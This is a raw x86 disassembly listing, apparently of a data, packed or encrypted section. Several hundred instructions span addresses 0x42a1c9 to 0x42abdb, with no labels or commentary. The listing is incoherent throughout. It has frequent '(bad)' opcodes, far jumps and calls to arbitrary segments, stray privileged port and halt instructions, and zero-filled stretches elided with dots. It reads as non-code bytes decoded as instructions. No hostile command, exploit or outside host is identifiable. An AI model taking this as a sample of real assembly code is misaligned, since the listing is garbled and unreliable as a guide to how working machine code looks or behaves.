  42a1c9:	push   0x7b
  42a1cb:	lods   eax,DWORD PTR ds:[esi]
  42a1cc:	fs mov eax,0xf880ad99
  42a1d2:	push   esp
  42a1d3:	push   0x51
  42a1d5:	fst    st(7)
  42a1d7:	daa    
  42a1d8:	clc    
  42a1d9:	sbb    ah,BYTE PTR [eax-0x73b4233d]
  42a1df:	mov    cl,0x3f
  42a1e1:	lods   al,BYTE PTR ds:[si]
  42a1e3:	pop    es
  42a1e4:	xchg   edx,eax
  42a1e5:	push   edx
  42a1e6:	(bad)  
  42a1e7:	imul   esp,DWORD PTR [ebp+edi*1-0x3c],0xa4dda20
  42a1ef:	cmp    al,BYTE PTR [eax+0x1]
  42a1f2:	(bad)  
  42a1f3:	sub    ebx,DWORD PTR [esi]
  42a1f5:	mov    cl,0xb5
  42a1f7:	int3   
  42a1f8:	js     0x42a250
  42a1fa:	or     ecx,DWORD PTR [ecx]
  42a1fc:	sub    eax,0xffc9966d
  42a201:	mov    BYTE PTR ds:0xbcff19d9,cl
  42a207:	(bad)  
  42a208:	lock sbb edx,ebp
  42a20b:	shl    dl,0xb2
  42a20e:	(bad)  
  42a20f:	mov    dh,0x0
	...
  42a271:	add    BYTE PTR [eax],al
  42a273:	add    BYTE PTR [ebx],ch
  42a275:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a27b:	mov    bh,0x1a
  42a27d:	aas    
  42a27e:	scas   al,BYTE PTR es:[edi]
  42a27f:	fst    DWORD PTR [edi+0x73]
  42a282:	in     eax,0x2
  42a284:	nop
  42a285:	ret    0x1
  42a288:	add    al,0x1
  42a28a:	add    BYTE PTR [eax],al
  42a28c:	es dec eax
  42a28e:	mov    ds:0x89ea256c,al
  42a293:	mov    esp,0x45b99cec
  42a298:	popf   
  42a299:	xchg   DWORD PTR ds:0xed1249b2,ecx
  42a29f:	sbb    edi,DWORD PTR [ecx]
  42a2a1:	test   al,0x85
  42a2a3:	pop    ss
  42a2a4:	ret    
  42a2a5:	add    DWORD PTR [ebx+0x16],ebx
  42a2a8:	out    dx,al
  42a2a9:	(bad)  
  42a2aa:	in     eax,dx
  42a2ab:	adc    DWORD PTR [ebp+0x3e],edi
  42a2ae:	push   eax
  42a2af:	stos   BYTE PTR es:[edi],al
  42a2b0:	inc    ebp
  42a2b1:	inc    ebp
  42a2b2:	data16 jmp 0x42a2b3
  42a2b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2b6:	xor    al,0xb7
  42a2b8:	ror    BYTE PTR [esi-0x19429e20],cl
  42a2be:	jp     0x42a2f3
  42a2c0:	fist   DWORD PTR [edx]
  42a2c2:	cld    
  42a2c3:	es js  0x42a279
  42a2c6:	and    eax,0x6317a3ee
  42a2cb:	jbe    0x42a341
  42a2cd:	test   eax,0xe9f007e1
  42a2d2:	adc    bh,bh
  42a2d4:	fidiv  WORD PTR [eax]
  42a2d6:	xor    eax,0x75edcf2a
  42a2db:	adc    ecx,ebx
  42a2dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a2de:	retf   
  42a2df:	xor    al,0x72
  42a2e1:	sub    bh,ch
  42a2e3:	add    eax,0xee1fe6a5
  42a2e8:	mov    dl,0xd5
  42a2ea:	push   eax
  42a2eb:	mov    al,0x67
  42a2ed:	out    dx,al
  42a2ee:	pushf  
  42a2ef:	or     eax,ecx
  42a2f1:	inc    ebp
  42a2f2:	mov    ch,dl
  42a2f4:	fisub  DWORD PTR [ebx+edx*8+0x49]
  42a2f8:	fwait
  42a2f9:	mov    dh,0xf
  42a2fb:	add    bh,BYTE PTR [esi+0x655dac0a]
  42a301:	jmp    0x1582713f
  42a306:	fidivr WORD PTR [edx-0x5e18e4b8]
  42a30c:	or     al,0x5e
  42a30e:	add    eax,0x8ade9cfa
  42a313:	add    eax,0x7c692b6d
  42a318:	pop    ds
  42a319:	sbb    al,0x9d
  42a31b:	and    BYTE PTR ds:0xedf9d98c,dl
  42a321:	mov    ebx,es
  42a323:	xchg   edi,eax
  42a324:	jns    0x42a3a5
  42a326:	pop    es
  42a327:	jg     0x42a2ed
  42a329:	lahf   
  42a32a:	jnp    0x42a338
  42a32c:	lahf   
  42a32d:	in     eax,dx
  42a32e:	cli    
  42a32f:	int    0x73
  42a331:	inc    edx
  42a332:	fdiv   QWORD PTR [ecx]
  42a334:	je     0x42a33a
  42a336:	xor    eax,0xa7b95224
  42a33b:	rol    edx,cl
  42a33d:	stos   BYTE PTR es:[edi],al
  42a33e:	sub    BYTE PTR [edi-0x2abe4f68],al
  42a344:	int3   
  42a345:	and    BYTE PTR [edx],dl
  42a347:	mov    ecx,0x3eb0a513
  42a34c:	xor    al,bl
  42a34e:	sub    ah,dh
  42a350:	ins    DWORD PTR es:[edi],dx
  42a351:	push   0x130d54a5
  42a356:	sti    
  42a357:	push   esi
  42a358:	pushf  
  42a359:	xor    DWORD PTR [ebx],edi
  42a35b:	mov    ds:0xf0a9e7e,eax
  42a360:	mov    eax,ds:0xd2cc5bbc
  42a365:	push   ds
  42a366:	call   0xd83d:0xc9c2d81
  42a36d:	adc    DWORD PTR [eax-0x5718730f],0xffffff88
  42a374:	push   0x6e
  42a376:	test   BYTE PTR [ebx+0x58],ah
  42a379:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42a37b:	or     esi,DWORD PTR [esi]
  42a37d:	adc    al,0x23
  42a37f:	out    dx,al
  42a380:	mov    ds:0xbe0846ca,eax
  42a385:	adc    bh,BYTE PTR [eax]
  42a387:	xchg   esi,eax
  42a388:	jp     0x42a39c
  42a38a:	imul   edi,DWORD PTR [ecx+0x84154d0],0x0
	...
  42a3f1:	add    BYTE PTR [eax],al
  42a3f3:	add    BYTE PTR [edi+0xe],bh
  42a3f6:	jne    0x42a433
  42a3f8:	jne    0x42a475
  42a3fa:	jg     0x42a44a
  42a3fc:	loop   0x42a467
  42a3fe:	mov    ebp,0xdde8263d
  42a403:	das    
  42a404:	xchg   esp,eax
  42a405:	ret    
  42a406:	add    DWORD PTR [eax],eax
  42a408:	add    al,0x1
  42a40a:	add    BYTE PTR [eax],al
  42a40c:	je     0x42a45c
  42a40e:	sbb    al,0xf5
  42a410:	push   esi
  42a411:	outs   dx,BYTE PTR ds:[esi]
  42a412:	loope  0x42a466
  42a414:	loope  0x42a3b8
  42a416:	shl    BYTE PTR [edx-0xec3df45],0xe9
  42a41d:	xor    DWORD PTR [ebp-0x7df596d3],edi
  42a423:	pop    es
  42a424:	jae    0x42a437
  42a426:	push   ebp
  42a427:	add    cl,0x42
  42a42a:	and    bh,dh
  42a42c:	(bad)  
  42a42d:	cmp    ecx,eax
  42a42f:	xor    dh,ah
  42a431:	scas   al,BYTE PTR es:[edi]
  42a432:	pop    esp
  42a433:	loopne 0x42a465
  42a435:	or     al,0x42
  42a437:	mul    DWORD PTR [ebx]
  42a439:	or     eax,0x27dfc3f3
  42a43e:	push   edi
  42a43f:	sti    
  42a440:	fcom   QWORD PTR [ebx-0x6d08cb19]
  42a446:	jmp    0x42a3df
  42a448:	jnp    0x42a423
  42a44a:	aaa    
  42a44b:	xor    DWORD PTR [edx],ebx
  42a44d:	xchg   esi,eax
  42a44e:	push   ecx
  42a44f:	push   0x44
  42a451:	jmp    0x4da4:0xb2c60202
  42a458:	mov    ds,WORD PTR [ebx]
  42a45a:	call   edi
  42a45c:	mov    dl,0xf5
  42a45e:	push   ecx
  42a45f:	jno    0x42a42f
  42a461:	add    ebx,DWORD PTR [ebx-0xd]
  42a464:	and    al,0x77
  42a466:	stos   BYTE PTR es:[edi],al
  42a467:	add    DWORD PTR [edx-0x2a2dae0a],esi
  42a46d:	nop
  42a46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a46f:	ret    
  42a470:	fist   DWORD PTR [ebx+0x73]
  42a473:	xor    DWORD PTR [ebx+0x12],esi
  42a476:	repnz and al,0x1f
  42a479:	mov    edx,0x2e51bd3f
  42a47e:	mov    eax,ds:0xc74679d2
  42a483:	add    eax,0x70fa4c0a
  42a488:	retf   0xb66d
  42a48b:	jns    0x42a4d0
  42a48d:	mov    al,BYTE PTR [ebp+esi*8-0x207bfea6]
  42a494:	nop
  42a495:	(bad)  
  42a496:	int    0x8c
  42a498:	or     DWORD PTR [esi+ecx*1+0x2c64bc9f],0x526ab438
  42a4a3:	in     al,dx
  42a4a4:	inc    ecx
  42a4a5:	dec    edx
  42a4a6:	sti    
  42a4a7:	jg     0x42a442
  42a4a9:	fld    QWORD PTR [edx]
  42a4ab:	sahf   
  42a4ac:	test   DWORD PTR ds:0x5d08b016,edx
  42a4b2:	sahf   
  42a4b3:	xchg   ebx,eax
  42a4b4:	fist   DWORD PTR [ecx+0x4c3f4375]
  42a4ba:	xor    DWORD PTR [esp+edi*1],esi
  42a4bd:	or     cl,BYTE PTR [ebp-0x10aa92b8]
  42a4c3:	push   eax
  42a4c4:	inc    edi
  42a4c5:	pop    esp
  42a4c6:	mov    al,0x79
  42a4c8:	mov    ebp,0xdefdbf80
  42a4cd:	hlt    
  42a4ce:	mov    edi,0xe196c519
  42a4d3:	and    eax,0x46d04fdb
  42a4d8:	dec    DWORD PTR [edx+0xb841c79]
  42a4de:	cmp    eax,0xa6e78906
  42a4e3:	mov    bh,0x28
  42a4e5:	ins    BYTE PTR es:[edi],dx
  42a4e6:	scas   eax,DWORD PTR es:[edi]
  42a4e7:	mov    esp,0x8b79fe16
  42a4ec:	sub    eax,0xedd49b8e
  42a4f1:	call   0xa27:0xe0015a28
  42a4f8:	jecxz  0x42a514
  42a4fa:	out    dx,ax
  42a4fc:	clc    
  42a4fd:	loopne 0x42a510
  42a4ff:	mov    edi,DWORD PTR [edi]
  42a501:	arpl   WORD PTR [edi],dx
  42a503:	sbb    eax,DWORD PTR [ebp+0x4684c180]
  42a509:	dec    bh
  42a50b:	push   esi
  42a50c:	aam    0x72
  42a50e:	mov    cl,0x85
	...
  42a574:	sbb    BYTE PTR [edi+0x17],cl
  42a577:	mov    ecx,0xefbef957
  42a57c:	(bad)  
  42a57d:	cmc    
  42a57e:	mov    edx,0x32f3039f
  42a583:	ret    0xc498
  42a586:	add    DWORD PTR [eax],eax
  42a588:	add    al,0x1
  42a58a:	add    BYTE PTR [eax],al
  42a58c:	mul    BYTE PTR [eax-0x445cebad]
  42a592:	mov    ?,WORD PTR [ebx+0xf101dc4]
  42a598:	jmp    0x42a5e8
  42a59a:	in     eax,0xa4
  42a59c:	enter  0xd77f,0x52
  42a5a0:	push   eax
  42a5a1:	sub    DWORD PTR [ebx+ebp*1-0x3a],edx
  42a5a5:	mov    al,0xf4
  42a5a7:	push   ds
  42a5a8:	push   cs
  42a5a9:	iret   
  42a5aa:	cmp    esi,DWORD PTR [edx-0xe7b115]
  42a5b0:	jl     0x42a5a9
  42a5b2:	arpl   WORD PTR fs:[edi],dx
  42a5b5:	adc    ebp,DWORD PTR [ebx-0x6b]
  42a5b8:	in     al,dx
  42a5b9:	iret   
  42a5ba:	arpl   sp,sp
  42a5bc:	jb     0x42a5a5
  42a5be:	xchg   ebx,eax
  42a5bf:	stos   DWORD PTR es:[edi],eax
  42a5c0:	pop    edx
  42a5c1:	test   DWORD PTR [edi],esp
  42a5c3:	push   edx
  42a5c4:	loope  0x42a5b3
  42a5c6:	hlt    
  42a5c7:	mov    cl,0xe4
  42a5c9:	sub    DWORD PTR [edx-0x5],esp
  42a5cc:	or     eax,0x99be6a49
  42a5d1:	das    
  42a5d2:	mov    al,0xbc
  42a5d4:	out    0xe1,eax
  42a5d6:	test   eax,0xe4c52889
  42a5db:	pushf  
  42a5dc:	ror    BYTE PTR ds:0x2757c82a,0x70
  42a5e3:	inc    esi
  42a5e4:	int    0x75
  42a5e6:	mov    ecx,0x244c80b4
  42a5eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5ec:	sbb    al,0xbc
  42a5ee:	(bad)  
  42a5f0:	pop    es
  42a5f1:	mov    ebp,0xb0c443e6
  42a5f6:	dec    esi
  42a5f7:	pop    ss
  42a5f8:	jmp    0x42a5a6
  42a5fa:	gs mov BYTE PTR cs:[ecx+0x5ea21405],bh
  42a602:	pmuludq mm3,QWORD PTR [ebx+0x15]
  42a606:	and    edx,edi
  42a608:	pop    es
  42a609:	(bad)  
  42a60a:	sbb    ebx,ebx
  42a60c:	lahf   
  42a60d:	mov    ds:0x6e3beb6c,eax
  42a612:	test   BYTE PTR [esi+0x58667b38],al
  42a618:	sub    ebx,ecx
  42a61a:	xor    BYTE PTR [eax-0x1b6ff270],ah
  42a620:	cli    
  42a621:	in     eax,dx
  42a622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a623:	aaa    
  42a624:	cmp    DWORD PTR [esp+ecx*2+0x11],ebx
  42a628:	scas   al,BYTE PTR es:[edi]
  42a629:	cmp    DWORD PTR [ebx],esp
  42a62b:	push   ecx
  42a62c:	mov    cl,0x76
  42a62e:	mov    dl,0xdc
  42a630:	int    0x7
  42a632:	out    0x77,al
  42a634:	mov    al,ds:0x7dd96e98
  42a639:	(bad)  
  42a63a:	xor    esi,DWORD PTR [ecx+ebx*4+0x43188157]
  42a641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a642:	adc    DWORD PTR [esi],ebp
  42a644:	xchg   ecx,eax
  42a645:	ins    DWORD PTR es:[edi],dx
  42a646:	mul    esp
  42a648:	test   edi,edi
  42a64a:	out    dx,eax
  42a64b:	inc    ebp
  42a64c:	xor    eax,0xce59cd12
  42a651:	ficom  WORD PTR [edi+edi*1-0x2c]
  42a655:	jmp    0x50b8ee62
  42a65a:	fst    DWORD PTR [ecx+0x4a]
  42a65d:	sub    al,BYTE PTR [ebx+0x3fee5840]
  42a663:	arpl   WORD PTR [esi],si
  42a665:	mov    BYTE PTR [edx+0x52],ch
  42a668:	loopne 0x42a699
  42a66a:	pop    ds
  42a66b:	xchg   ebx,eax
  42a66c:	dec    eax
  42a66d:	push   ds
  42a66e:	and    ebx,DWORD PTR [edx]
  42a670:	dec    esp
  42a671:	inc    ebx
  42a672:	sub    al,0xdf
  42a674:	xor    al,0x3a
  42a676:	not    DWORD PTR [esi+0x16]
  42a679:	pop    edx
  42a67a:	push   edx
  42a67b:	fs jmp 0xdc4f:0x64d1319a
  42a683:	mov    gs,WORD PTR [edx-0x6f]
  42a686:	cmp    eax,0xba7e080a
  42a68b:	or     DWORD PTR [edi+0x10],edx
  42a68e:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  42a6f2:	add    BYTE PTR [eax],al
  42a6f4:	and    al,0x16
  42a6f6:	outs   dx,BYTE PTR ds:[esi]
  42a6f7:	(bad)  
  42a6f8:	jle    0x42a6f9
  42a6fa:	lods   eax,DWORD PTR ds:[esi]
  42a6fb:	test   DWORD PTR [edi-0x5947ece4],0x9cd6d344
  42a705:	lds    eax,FWORD PTR [ecx]
  42a707:	add    BYTE PTR [ecx+eax*1],al
  42a70a:	add    BYTE PTR [eax],al
  42a70c:	fs mov ebx,0x332cf963
  42a712:	popf   
  42a713:	pop    eax
  42a714:	mov    esi,DWORD PTR [ecx+0x6d]
  42a717:	dec    eax
  42a718:	aaa    
  42a719:	jo     0x42a75b
  42a71b:	or     eax,0xb5ceeb49
  42a720:	push   ebx
  42a721:	dec    eax
  42a722:	xor    bh,bh
  42a724:	or     ebx,DWORD PTR [edx]
  42a726:	loop   0x42a73b
  42a728:	mov    ah,0x7e
  42a72a:	mov    al,ds:0x473e377c
  42a72f:	cdq    
  42a730:	mov    bl,0xc9
  42a732:	loope  0x42a7a7
  42a734:	ds pop ss
  42a736:	xchg   ebp,eax
  42a737:	jecxz  0x42a6c9
  42a739:	cmp    DWORD PTR [eax-0x133aa6ff],0x4
  42a740:	xor    al,al
  42a742:	and    BYTE PTR [esi+0x5a302032],cl
  42a748:	mov    ebp,0x4f8ba9c3
  42a74d:	jmp    0xbef6:0xf87869c
  42a754:	ins    BYTE PTR es:[edi],dx
  42a755:	aam    0x63
  42a757:	in     eax,0x4d
  42a759:	stc    
  42a75a:	outs   dx,DWORD PTR ds:[esi]
  42a75b:	adc    DWORD PTR [ebx+0x7d],edx
  42a75e:	xor    DWORD PTR [edi],0x10a90e22
  42a764:	mov    ebp,0x9a8061f6
  42a769:	sbb    DWORD PTR [esi-0x2d],edx
  42a76c:	mov    DWORD PTR [esi-0x1f],eax
  42a76f:	repz data16 aaa 
  42a772:	(bad)  
  42a774:	or     BYTE PTR [edx],bl
  42a776:	dec    ecx
  42a777:	stos   DWORD PTR es:[edi],eax
  42a778:	ins    DWORD PTR es:[edi],dx
  42a779:	ins    DWORD PTR es:[edi],dx
  42a77a:	pop    ecx
  42a77b:	(bad)  
  42a77c:	icebp  
  42a77d:	mov    esp,0xce267744
  42a782:	cmp    cl,BYTE PTR [edx+ecx*2]
  42a785:	inc    ebx
  42a786:	pop    ecx
  42a787:	(bad)  
  42a788:	pusha  
  42a789:	mov    ebp,0x4b4e7b5e
  42a78e:	inc    esp
  42a78f:	cmp    bl,BYTE PTR [ecx-0x19]
  42a792:	push   ss
  42a793:	pop    ss
  42a794:	jle    0x42a74c
  42a796:	lds    esp,FWORD PTR [esi-0x3bad66b2]
  42a79c:	lea    esp,[ecx]
  42a79e:	dec    ebx
  42a79f:	addr16 cmp al,al
  42a7a2:	inc    edx
  42a7a3:	out    dx,al
  42a7a4:	add    eax,esp
  42a7a6:	imul   edx,DWORD PTR [ecx-0x4b152770],0xffffff9e
  42a7ad:	shr    BYTE PTR ds:0x5012da48,cl
  42a7b3:	adc    BYTE PTR [edx-0x5d],ah
  42a7b6:	inc    edx
  42a7b7:	and    edi,DWORD PTR [esi+0x13]
  42a7ba:	int3   
  42a7bb:	inc    ecx
  42a7bc:	imul   eax,edx,0xf59e13e3
  42a7c2:	into   
  42a7c3:	fisttp WORD PTR [edx+0x2e]
  42a7c6:	jecxz  0x42a7bf
  42a7c8:	mov    edi,0x9751143f
  42a7cd:	and    DWORD PTR [edi+0x68337b51],eax
  42a7d3:	(bad)  
  42a7d5:	pop    es
  42a7d6:	xor    eax,ecx
  42a7d8:	pop    ecx
  42a7d9:	gs and al,0xf0
  42a7dc:	fiadd  DWORD PTR [eax]
  42a7de:	push   ds
  42a7df:	test   ah,al
  42a7e1:	mov    dh,0xb
  42a7e3:	enter  0x6676,0x88
  42a7e7:	ds jmp 0x42a826
  42a7ea:	sbb    dl,BYTE PTR [ecx-0x27]
  42a7ed:	sbb    DWORD PTR [ecx-0x1b8977bc],eax
  42a7f3:	cmp    BYTE PTR [ecx],bh
  42a7f5:	loopne 0x42a815
  42a7f7:	xchg   esp,eax
  42a7f8:	xchg   esi,eax
  42a7f9:	and    cl,BYTE PTR [esi]
  42a7fb:	cs push ebp
  42a7fd:	das    
  42a7fe:	cdq    
  42a7ff:	adc    al,0x97
  42a801:	int3   
  42a802:	scas   al,BYTE PTR es:[edi]
  42a803:	bound  eax,QWORD PTR [edi]
  42a805:	add    al,BYTE PTR [eax]
  42a807:	leave  
  42a808:	pop    ebp
  42a809:	add    al,0x6b
  42a80b:	pop    ecx
  42a80c:	(bad)  
  42a80d:	(bad)  
  42a80e:	or     eax,0x5a
	...
  42a873:	add    BYTE PTR [edx-0x10409c9b],cl
  42a879:	mov    edi,0xc58175de
  42a87e:	xchg   edi,eax
  42a87f:	ins    BYTE PTR es:[edi],dx
  42a880:	cmp    eax,0xa00d518c
  42a885:	mov    BYTE PTR [ecx],0x0
  42a888:	add    al,0x1
  42a88a:	add    BYTE PTR [eax],al
  42a88c:	fucomp st(5)
  42a88e:	and    al,0x1b
  42a890:	enter  0x34ae,0xe1
  42a894:	inc    eax
  42a895:	or     dh,cl
  42a897:	sub    eax,0x8dba01b
  42a89c:	xchg   esi,eax
  42a89d:	mov    ecx,0x2e3f202b
  42a8a2:	push   es
  42a8a3:	lahf   
  42a8a4:	test   eax,0x1af681df
  42a8a9:	mov    edx,0xb740a4c0
  42a8ae:	loopne 0x42a851
  42a8b0:	jne    0x42a8d1
  42a8b2:	mov    ecx,0x4db7bac0
  42a8b7:	add    ebp,DWORD PTR [esi]
  42a8b9:	sar    DWORD PTR [esi+0x43b27947],0xf9
  42a8c0:	cmp    eax,0x8deb9bd8
  42a8c5:	or     DWORD PTR [ecx+0x3e1c6faa],edx
  42a8cb:	pop    es
  42a8cc:	inc    eax
  42a8cd:	ret    
  42a8ce:	ins    DWORD PTR es:[edi],dx
  42a8cf:	or     DWORD PTR [eax+0x8],eax
  42a8d2:	mov    dh,0x54
  42a8d4:	in     al,dx
  42a8d5:	push   esp
  42a8d6:	les    edi,FWORD PTR [esi+0x59]
  42a8d9:	imul   esi,DWORD PTR [bp+0x23ed],0xffffffa2
  42a8df:	sbb    eax,0x4d8face0
  42a8e4:	test   DWORD PTR [ecx+ecx*1-0x2e],ebp
  42a8e8:	cmp    cl,bh
  42a8ea:	inc    ecx
  42a8eb:	jbe    0x42a8a9
  42a8ed:	(bad)  
  42a8ee:	push   ebx
  42a8ef:	sbb    eax,ecx
  42a8f1:	dec    ecx
  42a8f2:	jae    0x42a89e
  42a8f4:	dec    edi
  42a8f5:	sub    al,cl
  42a8f7:	out    dx,al
  42a8f8:	and    ch,ah
  42a8fa:	fsubr  st,st(3)
  42a8fc:	jo     0x42a905
  42a8fe:	mov    ah,0x79
  42a900:	or     ch,BYTE PTR [ecx]
  42a902:	pop    eax
  42a903:	adc    DWORD PTR [ecx-0x15836927],ecx
  42a909:	in     eax,0x80
  42a90b:	push   0xafa778cc
  42a910:	jnp    0x42a8c2
  42a912:	add    edi,DWORD PTR [edi-0x625eab6d]
  42a918:	sbb    BYTE PTR [edx+0x5c83fa55],al
  42a91e:	rcr    DWORD PTR [eax],0x58
  42a921:	popa   
  42a922:	jle    0x42a96d
  42a924:	jge    0x42a935
  42a926:	mov    es,WORD PTR [edi+esi*4-0x46]
  42a92a:	dec    esi
  42a92b:	adc    al,0xe7
  42a92d:	aam    0xe7
  42a92f:	pop    eax
  42a930:	sub    bl,cl
  42a932:	xor    eax,0x517f11d7
  42a937:	push   ss
  42a938:	leave  
  42a939:	imul   ebp,DWORD PTR [edx+0x31674b0],0xffffff91
  42a940:	adc    BYTE PTR [edx+0x1b],bh
  42a943:	inc    ebp
  42a944:	ja     0x42a986
  42a946:	dec    esp
  42a947:	aam    0x8d
  42a949:	adc    DWORD PTR [ebp-0x41],edx
  42a94c:	ds ss jae 0x42a9c0
  42a950:	in     eax,0x70
  42a952:	into   
  42a953:	add    esp,DWORD PTR ds:0x896dd870
  42a959:	pop    ebx
  42a95a:	and    edi,edi
  42a95c:	sahf   
  42a95d:	xchg   esi,eax
  42a95e:	pop    esp
  42a95f:	push   edi
  42a960:	test   DWORD PTR [edi-0x57],ebp
  42a963:	lods   al,BYTE PTR ds:[esi]
  42a964:	ret    
  42a965:	cld    
  42a966:	xchg   esi,eax
  42a967:	loop   0x42a95f
  42a969:	mov    cl,0x9c
  42a96b:	or     esp,0xffffff86
  42a96e:	dec    eax
  42a96f:	mov    ds:0xccbd4bf4,al
  42a974:	ret    
  42a975:	mov    ah,0xf4
  42a977:	inc    edx
  42a978:	aam    0x6f
  42a97a:	xchg   ebx,eax
  42a97b:	jb     0x42a92f
  42a97d:	aaa    
  42a97e:	jl     0x42a939
  42a980:	and    BYTE PTR [ebp+0x50],cl
  42a983:	js     0x42a90c
  42a985:	mov    al,ds:0x17b5e966
  42a98a:	jae    0x42a9a9
  42a98c:	call   0x0:0x466c01
	...
  42a9f3:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a9f9:	out    dx,al
  42a9fa:	sti    
  42a9fb:	xlat   BYTE PTR ds:[ebx]
  42a9fc:	in     eax,0xd3
  42a9fe:	aad    0x7
  42aa00:	test   bh,0xcc
  42aa03:	pusha  
  42aa04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa05:	mov    DWORD PTR [ecx],0x10400
  42aa0b:	add    BYTE PTR [edx+eax*8-0x20],ah
  42aa0f:	clc    
  42aa10:	pop    ecx
  42aa11:	jle    0x42a9e2
  42aa13:	push   esi
  42aa14:	ror    DWORD PTR [eax+esi*8+0x5fbc4304],cl
  42aa1b:	aam    0x56
  42aa1d:	daa    
  42aa1e:	xor    eax,DWORD PTR [ebp+0x6b4e5b74]
  42aa24:	add    al,0xae
  42aa26:	jp     0x42aa36
  42aa28:	(bad)
  42aa2d:	nop
  42aa2e:	sbb    cl,BYTE PTR [edi]
  42aa30:	and    al,BYTE PTR [edx]
  42aa32:	pop    esi
  42aa33:	retf   0xd91b
  42aa36:	fwait
  42aa37:	jns    0x42aa00
  42aa39:	xor    BYTE PTR [edx],0x4d
  42aa3c:	xchg   edx,esp
  42aa3e:	pusha  
  42aa3f:	loop   0x42aa98
  42aa41:	(bad)  
  42aa42:	into   
  42aa43:	vpavgb xmm4,xmm6,XMMWORD PTR [ecx+0x24d92a83]
  42aa4b:	lods   eax,DWORD PTR ss:[esi]
  42aa4d:	ror    cl,0x63
  42aa50:	xchg   DWORD PTR [edi-0x2c8e10d3],ecx
  42aa56:	repz idiv BYTE PTR [esp+ecx*4]
  42aa5a:	xchg   edi,eax
  42aa5b:	cmc    
  42aa5c:	xchg   bh,bh
  42aa5e:	pop    ecx
  42aa5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa60:	push   edx
  42aa61:	(bad)  
  42aa63:	mov    edi,0xc051db0e
  42aa68:	iret   
  42aa69:	mov    edx,0x2be9863e
  42aa6e:	adc    BYTE PTR [edx-0x66],al
  42aa71:	test   eax,0x6d9bae73
  42aa76:	or     dl,BYTE PTR [edx+ebx*1-0x26]
  42aa7a:	push   edi
  42aa7b:	das    
  42aa7c:	retf   0x9290
  42aa7f:	push   esi
  42aa80:	add    cl,BYTE PTR [ecx+edi*2]
  42aa83:	in     al,dx
  42aa84:	rcr    DWORD PTR [edi],cl
  42aa86:	jge    0x42aa81
  42aa88:	sub    dl,BYTE PTR [esi+ebp*1]
  42aa8b:	mov    eax,0xd7d4bb19
  42aa90:	push   0x4c
  42aa92:	xchg   ebx,eax
  42aa93:	mov    ecx,0x3b353b4d
  42aa98:	pop    ebp
  42aa99:	mov    cl,0x22
  42aa9b:	xor    al,0xe8
  42aa9d:	add    DWORD PTR [ecx+eax*1],esp
  42aaa0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaa1:	and    eax,0xf29615b
  42aaa6:	(bad)  
  42aaa7:	pop    edi
  42aaa8:	mov    ecx,0x114c0b7a
  42aaad:	lods   al,BYTE PTR ds:[esi]
  42aaae:	cmp    bh,BYTE PTR [edi]
  42aab0:	jl     0x42aa7c
  42aab2:	test   BYTE PTR [esi],0xa2
  42aab5:	xor    al,0x6d
  42aab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aab8:	inc    eax
  42aab9:	mov    ecx,0x18b31939
  42aabe:	cli    
  42aabf:	mov    ds:0x2c89c192,al
  42aac4:	and    al,0x40
  42aac6:	sar    DWORD PTR [eax],cl
  42aac8:	not    BYTE PTR [ebx+0x37e405fb]
  42aace:	ss ins BYTE PTR es:[edi],dx
  42aad0:	push   ebx
  42aad1:	sti    
  42aad2:	popa   
  42aad3:	sub    bh,ah
  42aad5:	fadd   st,st(0)
  42aad7:	and    al,0x58
  42aad9:	dec    ebp
  42aada:	in     al,0x76
  42aadc:	jb     0x42aa84
  42aade:	clc    
  42aadf:	pop    ecx
  42aae0:	sbb    ecx,ebp
  42aae2:	test   al,0xd4
  42aae4:	mov    edi,0xacdc9520
  42aae9:	mov    eax,ds:0xdc4a32a9
  42aaee:	or     dh,BYTE PTR [ecx+edx*4]
  42aaf1:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aaf3:	shl    DWORD PTR [eax+eiz*1+0x16],0xaa
  42aaf8:	xchg   eax,eax
  42aafa:	imul   esp,esp,0xffffffdb
  42aafd:	push   esi
  42aafe:	in     eax,0x61
  42ab00:	mov    bl,0x7f
  42ab02:	loop   0x42aac7
  42ab04:	(bad)  
  42ab05:	mov    eax,ds:0x8e1cb84
  42ab0a:	cmp    eax,DWORD PTR [edx-0x17]
  42ab0d:	sbb    esi,DWORD PTR [ebp+0xdd]
	...
  42ab73:	add    BYTE PTR [esi],bh
  42ab75:	push   cs
  42ab76:	sub    al,0x5d
  42ab78:	cmp    al,0x7f
  42ab7a:	jg     0x42abeb
  42ab7c:	and    BYTE PTR [eax],cl
  42ab7e:	mov    dl,0x43
  42ab80:	and    ecx,esi
  42ab82:	mov    ebx,0x1c8a841
  42ab87:	add    BYTE PTR [ecx+eax*1],al
  42ab8a:	add    BYTE PTR [eax],al
  42ab8c:	fwait
  42ab8d:	xchg   esi,eax
  42ab8e:	cmp    eax,0x3326e5a8
  42ab93:	hlt    
  42ab94:	ds cmp ch,al
  42ab97:	push   eax
  42ab98:	mov    dl,0x86
  42ab9a:	or     ecx,DWORD PTR ds:0x21eb6f
  42aba0:	jmp    DWORD PTR [eax+0x426ae5eb]
  42aba6:	call   0x2f68e90d
  42abab:	ds std 
  42abad:	dec    ecx
  42abae:	mov    edi,0x3addf447
  42abb3:	(bad)  
  42abb4:	mov    fs,WORD PTR [edx-0x519a2371]
  42abba:	jp     0x42aba2
  42abbc:	add    bl,al
  42abbe:	bound  eax,QWORD PTR [edi-0x27]
  42abc1:	mov    ah,0x49
  42abc3:	mov    bh,BYTE PTR [ecx]
  42abc5:	lock mov ebp,0xe52a1c6b
  42abcb:	xor    BYTE PTR [ecx+0x6],ch
  42abce:	out    dx,eax
  42abcf:	pop    eax
  42abd0:	sub    eax,0x8b20a445
  42abd5:	mov    DWORD PTR [eax+0xb9a496f],esp
  42abdb:	mov    al,0xd
